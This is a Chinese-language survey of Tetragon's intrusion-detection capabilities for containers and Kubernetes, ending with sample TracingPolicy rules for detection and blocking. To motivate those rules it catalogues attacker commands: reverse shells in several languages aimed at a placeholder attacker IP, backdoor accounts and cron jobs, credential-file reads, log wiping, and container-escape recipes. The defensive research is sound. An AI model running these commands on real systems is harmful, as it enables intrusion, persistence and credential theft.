# Tetragon 入侵检测能力调研

## 目录
- [1. Tetragon 概述](#1-tetragon-概述)
- [2. Tetragon 入侵检测能力分析](#2-tetragon-入侵检测能力分析)
- [3. 高危命令分类](#3-高危命令分类)
- [4. 容器提权方法](#4-容器提权方法)
- [5. Tetragon 策略示例](#5-tetragon-策略示例)

---

## 1. Tetragon 概述

Tetragon 是 Cilium 项目的一部分，是一个基于 eBPF 的安全可观测性和运行时执行工具。它能够在内核层面监控和拦截系统调用、进程执行、文件访问、网络活动等。

### 1.1 核心能力

| 能力 | 描述 |
|------|------|
| 进程监控 | 监控进程创建、执行、退出 |
| 文件监控 | 监控文件读写、权限变更 |
| 网络监控 | 监控网络连接、数据传输 |
| 系统调用监控 | 监控特定系统调用 |
| 运行时执行 | 实时阻断恶意行为 |

---

## 2. Tetragon 入侵检测能力分析

### 2.1 进程执行监控

Tetragon 可以通过 `process_exec` 和 `process_exit` 事件监控所有进程活动。

**可检测的入侵行为：**
- 反弹 Shell 执行
- 恶意脚本运行
- 提权工具使用
- 挖矿程序执行
- 后门程序启动

### 2.2 文件系统监控

通过 Kprobe 监控文件系统相关的系统调用。

**可检测的入侵行为：**
- 敏感文件读取（/etc/passwd, /etc/shadow）
- 配置文件篡改
- 恶意文件写入
- 权限提升操作

### 2.3 网络活动监控

**可检测的入侵行为：**
- 异常外连行为
- 反向 Shell 连接
- C2 通信
- 数据外泄

### 2.4 系统调用监控

**可检测的入侵行为：**
- 权限提升相关调用（setuid, setgid）
- 容器逃逸相关调用
- 内核模块加载

---

## 3. 高危命令分类

### 3.1 信息收集类

#### 系统信息
```bash
# 主机信息
uname -a
cat /etc/os-release
hostnamectl

# 内核信息
cat /proc/version
lsmod

# 网络信息
ifconfig / ip addr
netstat -antup / ss -antup
cat /etc/hosts
cat /etc/resolv.conf

# 用户信息
whoami
id
cat /etc/passwd
cat /etc/shadow
cat /etc/group
last
w
```

#### 容器/K8s 环境探测
```bash
# 检测是否在容器中
cat /proc/1/cgroup
ls -la /.dockerenv
cat /proc/self/mountinfo | grep docker

# K8s 信息
env | grep -i kube
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
```

### 3.2 持久化类

#### 定时任务
```bash
crontab -e
echo "* * * * * /tmp/backdoor.sh" >> /var/spool/cron/root
echo "* * * * * root /tmp/backdoor.sh" >> /etc/crontab
```

#### SSH 后门
```bash
echo "攻击者公钥" >> ~/.ssh/authorized_keys
mkdir -p ~/.ssh && chmod 700 ~/.ssh
```

#### 用户账户
```bash
useradd -o -u 0 -g 0 backdoor
echo "backdoor:password" | chpasswd
usermod -aG sudo backdoor
```

#### 启动项
```bash
# Systemd
systemctl enable malicious.service

# init.d
chmod +x /etc/init.d/malicious
update-rc.d malicious defaults
```

### 3.3 横向移动类

#### SSH 相关
```bash
ssh user@target
scp file user@target:/path
ssh-keyscan target
```

#### 凭据窃取
```bash
cat ~/.ssh/id_rsa
cat ~/.ssh/known_hosts
cat ~/.bash_history
cat /etc/shadow
```

#### 网络扫描
```bash
nmap -sn 10.0.0.0/24
ping -c 1 target
nc -zv target 1-1000
```

### 3.4 反弹 Shell 类

#### Bash 反弹
```bash
bash -i >& /dev/tcp/攻击者IP/端口 0>&1
bash -c 'bash -i >& /dev/tcp/攻击者IP/端口 0>&1'
```

#### Netcat 反弹
```bash
nc -e /bin/bash 攻击者IP 端口
nc 攻击者IP 端口 -e /bin/sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 攻击者IP 端口 >/tmp/f
```

#### Python 反弹
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("攻击者IP",端口));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

#### Perl 反弹
```bash
perl -e 'use Socket;$i="攻击者IP";$p=端口;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### PHP 反弹
```bash
php -r '$sock=fsockopen("攻击者IP",端口);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### 3.5 提权类

#### SUID 利用
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

#### Sudo 滥用
```bash
sudo -l
sudo su -
sudo /bin/bash
```

#### Capabilities 利用
```bash
getcap -r / 2>/dev/null
```

#### 内核漏洞利用
```bash
# DirtyPipe (CVE-2022-0847)
./dirtypipe /etc/passwd

# DirtyCow (CVE-2016-5195)
./dirtycow /etc/passwd
```

### 3.6 防御规避类

#### 日志清理
```bash
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
history -c
unset HISTFILE
export HISTSIZE=0
rm ~/.bash_history
```

#### 文件隐藏
```bash
touch .hidden_file
chattr +i file  # 设置不可修改
```

#### 进程隐藏
```bash
# 使用 LD_PRELOAD 隐藏进程
export LD_PRELOAD=/path/to/libhide.so
```

---

## 4. 容器提权方法

### 4.1 特权容器逃逸

#### 4.1.1 挂载宿主机文件系统
```bash
# 检查是否为特权容器
cat /proc/self/status | grep Cap
# CapEff: 0000003fffffffff 表示特权容器

# 挂载宿主机根目录
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host
```

#### 4.1.2 cgroup release_agent 逃逸
```bash
# 在特权容器中
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### 4.2 危险挂载利用

#### 4.2.1 Docker Socket 挂载
```bash
# 检查 Docker Socket
ls -la /var/run/docker.sock

# 利用 Docker Socket 逃逸
docker run -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh
```

#### 4.2.2 /proc/sys 挂载
```bash
# 如果 /proc/sys 可写
echo 1 > /proc/sys/kernel/core_pattern
```

### 4.3 Capabilities 滥用

#### 4.3.1 CAP_SYS_ADMIN
```bash
# 允许挂载文件系统
mount -t ext4 /dev/sda1 /mnt

# 允许使用 unshare 创建新命名空间
unshare -Urm
```

#### 4.3.2 CAP_SYS_PTRACE
```bash
# 可以 attach 到宿主机进程
# 如果 pid namespace 共享
cat /proc/1/root/etc/shadow
```

#### 4.3.3 CAP_NET_ADMIN
```bash
# 可以修改网络配置
# 可能进行 ARP 欺骗或网络嗅探
```

#### 4.3.4 CAP_DAC_READ_SEARCH
```bash
# 绕过文件读取权限检查
# 可以使用 open_by_handle_at 读取任意文件
./shocker /etc/shadow
```

### 4.4 内核漏洞利用

#### 4.4.1 容器内提权到 root
```bash
# CVE-2022-0847 DirtyPipe
./dirtypipe /usr/bin/su

# CVE-2022-0185
./exploit
```

#### 4.4.2 容器逃逸漏洞
```bash
# CVE-2020-15257 Containerd
# CVE-2019-5736 runc
```

### 4.5 Kubernetes 特定攻击

#### 4.5.1 ServiceAccount Token 利用
```bash
# 获取 Token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# 访问 API Server
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods
```

#### 4.5.2 创建特权 Pod
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
spec:
  containers:
  - name: attacker
    image: alpine
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
```

#### 4.5.3 节点代理利用
```bash
# 如果有权限访问 kubelet API
curl -k https://node-ip:10250/run/namespace/pod/container -d "cmd=id"
```

### 4.6 容器配置错误

#### 4.6.1 敏感路径挂载
```bash
# 检查敏感挂载
mount | grep -E "(docker|kube|etc)"
cat /proc/mounts

# 常见危险挂载
# /var/run/docker.sock
# /etc/kubernetes
# /root/.kube/config
```

#### 4.6.2 hostPID/hostNetwork
```bash
# hostPID=true 时
ps aux  # 可以看到宿主机进程
cat /proc/1/environ  # 读取宿主机进程环境变量

# hostNetwork=true 时
# 可以访问宿主机网络，包括 localhost 服务
```

---

## 5. Tetragon 策略示例

### 5.1 检测反弹 Shell

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: detect-reverse-shell
spec:
  kprobes:
  - call: "tcp_connect"
    syscall: false
    args:
    - index: 0
      type: "sock"
    selectors:
    - matchActions:
      - action: Post
        rateLimit: "1m"
      matchArgs:
      - index: 0
        operator: "SPort"
        values:
        - "0"  # 随机源端口，常见于反向连接
  - call: "sys_execve"
    syscall: true
    args:
    - index: 0
      type: "string"
    selectors:
    - matchArgs:
      - index: 0
        operator: "Postfix"
        values:
        - "/bin/sh"
        - "/bin/bash"
        - "/bin/dash"
      matchBinaries:
      - operator: "In"
        values:
        - "/usr/bin/nc"
        - "/usr/bin/ncat"
        - "/usr/bin/netcat"
```

### 5.2 检测敏感文件访问

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: detect-sensitive-file-access
spec:
  kprobes:
  - call: "fd_install"
    syscall: false
    args:
    - index: 0
      type: "int"
    - index: 1
      type: "file"
    selectors:
    - matchArgs:
      - index: 1
        operator: "Prefix"
        values:
        - "/etc/shadow"
        - "/etc/passwd"
        - "/etc/sudoers"
        - "/root/.ssh/"
        - "/var/run/secrets/kubernetes.io"
      matchActions:
      - action: Post
```

### 5.3 检测容器逃逸

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: detect-container-escape
spec:
  kprobes:
  - call: "sys_mount"
    syscall: true
    args:
    - index: 0
      type: "string"
    - index: 1
      type: "string"
    - index: 2
      type: "string"
    selectors:
    - matchActions:
      - action: Post
  - call: "sys_ptrace"
    syscall: true
    args:
    - index: 0
      type: "int"
    - index: 1
      type: "int"
    selectors:
    - matchArgs:
      - index: 0
        operator: "Equal"
        values:
        - "16"  # PTRACE_ATTACH
        - "17"  # PTRACE_SEIZE
      matchActions:
      - action: Post
```

### 5.4 检测提权行为

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: detect-privilege-escalation
spec:
  kprobes:
  - call: "sys_setuid"
    syscall: true
    args:
    - index: 0
      type: "int"
    selectors:
    - matchArgs:
      - index: 0
        operator: "Equal"
        values:
        - "0"
      matchActions:
      - action: Post
  - call: "sys_setgid"
    syscall: true
    args:
    - index: 0
      type: "int"
    selectors:
    - matchArgs:
      - index: 0
        operator: "Equal"
        values:
        - "0"
      matchActions:
      - action: Post
  - call: "cap_capable"
    syscall: false
    args:
    - index: 0
      type: "nop"
    - index: 1
      type: "user_namespace"
    - index: 2
      type: "int"
    selectors:
    - matchCapabilityChanges:
      - type: Effective
        operator: In
        isNamespaceCapability: false
        values:
        - "CAP_SYS_ADMIN"
        - "CAP_SYS_PTRACE"
      matchActions:
      - action: Post
```

### 5.5 阻断危险操作

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: block-dangerous-operations
spec:
  kprobes:
  - call: "sys_execve"
    syscall: true
    args:
    - index: 0
      type: "string"
    selectors:
    - matchBinaries:
      - operator: "In"
        values:
        - "/usr/bin/wget"
        - "/usr/bin/curl"
      matchArgs:
      - index: 0
        operator: "Postfix"
        values:
        - ".sh"
      matchActions:
      - action: Sigkill  # 直接终止进程
```

---

## 6. 总结

### 6.1 Tetragon 优势

1. **内核级监控**：基于 eBPF，性能开销低
2. **实时响应**：可以实时阻断恶意行为
3. **灵活策略**：TracingPolicy 支持细粒度配置
4. **容器感知**：原生支持容器和 Kubernetes 环境

### 6.2 建议监控重点

| 优先级 | 监控项 | 说明 |
|--------|--------|------|
| 高 | 反弹 Shell | 入侵者常用手段 |
| 高 | 容器逃逸 | 影响宿主机安全 |
| 高 | 敏感文件访问 | 凭据泄露风险 |
| 中 | 提权操作 | 权限提升风险 |
| 中 | 持久化行为 | 后门植入风险 |
| 低 | 信息收集 | 早期侦察阶段 |

### 6.3 最佳实践

1. 分层部署策略，从监控到阻断逐步加强
2. 结合业务场景定制白名单
3. 与 SIEM/SOAR 集成实现自动化响应
4. 定期更新策略应对新型攻击
